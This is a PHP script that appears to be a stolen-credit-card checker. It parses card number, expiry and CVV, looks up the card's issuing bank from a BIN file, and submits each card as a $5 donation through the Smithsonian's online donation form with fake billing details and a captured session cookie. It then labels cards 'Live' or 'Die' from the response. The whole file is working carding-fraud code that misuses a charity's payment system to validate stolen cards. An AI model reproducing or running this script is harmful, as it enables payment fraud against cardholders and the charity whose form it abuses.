<?php
include_once('include.php');

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $list = $_POST['receive'];
    }elseif($_SERVER['REQUEST_METHOD'] == 'GET'){
        $list = $_GET['receive'];
    }

    function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }

     function multiexplode($delimiters, $string) {
        $ready = str_replace($delimiters, $delimiters[0], $string);
        $launch = explode($delimiters[0], $ready);
        return $launch;
    }

    


    $explode = multiexplode(array(";", "»", "|", ":", " ", "/"), $list);
    $explode = array_values(array_filter($explode));
    @$cc  = trim($explode[0]);
    @$mes = trim($explode[1]);
    @$ano = trim($explode[2]);
    @$cvv = trim($explode[3]);

        function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
    }
    $info = getBin($cc);

    switch ($ano) { 
        case '21':$ano = '2021';break;
        case '22':$ano = '2022';break;
        case '23':$ano = '2023';break;
        case '24':$ano = '2024';break;
        case '25':$ano = '2025';break;
        case '26':$ano = '2026';break;
        case '27':$ano = '2027';break;
        case '28':$ano = '2028';break;
        case '29':$ano = '2029';break;
        case '30':$ano = '2030';break;
    }

        switch ($mes) { 
        case '1':$mes = '01';break;
        case '2':$mes = '02';break;
        case '3':$mes = '03';break;
        case '4':$mes = '04';break;
        case '5':$mes = '05';break;
        case '6':$mes = '06';break;
        case '7':$mes = '07';break;
        case '8':$mes = '08';break;
        case '9':$mes = '09';break;
    }

    switch (substr($cc, 0, 1)) {
        case '4':
        $typeCard = 1;
        $typeName = 'Visa';
        break;
        case '5':
        $typeCard = 2;
        $typeName = 'Master';
        break;
        case '3':
        $typeCard = 3;
        $typeName = 'American Express';
        break;
    }


    function __curl($data, $postdata = false, $header = false){ 

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $data);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, "");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() .'/cookie_bp.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() .'/cookie_bp.txt');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if($header){
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  
}
    if($postdata){
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);            
}
    $exec = curl_exec($ch);
    return $exec;
}
   #$link = __curl('https://www.hidabrootchannel.org/donate.html');
   #$phpsessid = getStr($link, 'PHPSESSID=', ';');
   #$token = getStr($link, 'type="hidden" value="', '" name="REQUEST_TOKEN"');

    $data = __curl('https://support.si.edu/site/Donation2', 'user_donation_amt=%245.00&company_min_matching_amt=&currency_locale=en_US&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpanded=47437&level_standardexpanded47437amount=%245.00&level_standardexpandedsubmit=true&level_standardsubmit=true&level_standardauto_repeatsubmit=true&tribute_show_honor_fieldssubmit=true&tribute_honoree_namename=&tribute_honoree_namesubmit_skip=true&nmnh_area_to_support_other_input=&nmnh_area_to_support_othersubmit=true&nmnh_areas_to_support_apihidden=&nmnh_areas_to_support_otherapihidden=&billing_first_namename=dwadwa&billing_first_namesubmit=true&billing_last_namename=dwad&billing_last_namesubmit=true&billing_addr_street1name=Adwad&billing_addr_street1submit=true&billing_addr_street2name=Awdwadwa&billing_addr_street2submit=true&billing_addr_cityname=Dawdwad&billing_addr_citysubmit=true&billing_addr_state=CA&billing_addr_statesubmit=true&billing_addr_zipname=32132&billing_addr_zipsubmit=true&billing_addr_country=Brazil&billing_addr_countrysubmit=true&donor_email_addressname=jonascena1337%40gmail.com&donor_email_addresssubmit=true&payment_typecc_typesubmit=true&payment_typecc_numbername='.$cc.'&payment_typecc_numbersubmit=true&payment_typecc_exp_date_MONTH='.$mes.'&payment_typecc_exp_date_YEAR='.$ano.'&payment_typecc_exp_date_DAY=1&payment_typecc_exp_datesubmit=true&payment_typecc_cvvname='.$cvv.'&payment_typecc_cvvsubmit=true&payment_typesubmit=true&pstep_finish=Donate&idb=474758908&df_id=19745&mfc_pref=T&19745.donation=form1', array(
       'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
       'Accept-Encoding: gzip, deflate, br',
       'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
       'Cache-Control: max-age=0',
       'Connection: keep-alive',
       'Content-Type: application/x-www-form-urlencoded',
       'Cookie: JSESSIONID=E823B6B6C88F26A056568B2F1329CA5C.app30130a; _ga=GA1.2.1469477992.1624497347; JSESSIONID=E823B6B6C88F26A056568B2F1329CA5C.app30130a; optimizelyEndUserId=oeu1624661772686r0.8772825151338808; optimizelySegments=%7B%223509930029%22%3A%22search%22%2C%223513580049%22%3A%22gc%22%2C%223515330131%22%3A%22false%22%7D; optimizelyBuckets=%7B%7D; __utma=1.991633883.1624491881.1624583092.1624661774.3; __utmc=1; __utmz=1.1624661774.3.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; optimizelyPendingLogEvents=%5B%5D; __utmb=1.5.10.1624661774',
       'Host: support.si.edu',
       'Origin: https://support.si.edu',
       'Referer: https://support.si.edu/site/Donation2',
       'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
       'sec-ch-ua-mobile: ?1',
       'Sec-Fetch-Dest: document',
       'Sec-Fetch-Mode: navigate',
       'Sec-Fetch-Site: same-origin',
       'Sec-Fetch-User: ?1',
       'Upgrade-Insecure-Requests: 1',
       'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'));
    $return = getStr($data, '["', '"]');

    print_r($data);

    if (strpos($data, 'Address Verification Failed.')) {
    echo '<li class="list-group-item"><h6>#{Live} Authorized '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' Return: '.$return.' '.$info.' Valor: R$ 5,00 #Hyz0</li>';
    }else{
    echo '<li class="list-group-item"><h6>#{Die} Unauthorized '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' Return: '.$return.' '.$info.' Valor: R$ 5,00 #Hyz0</li>';
    }

?>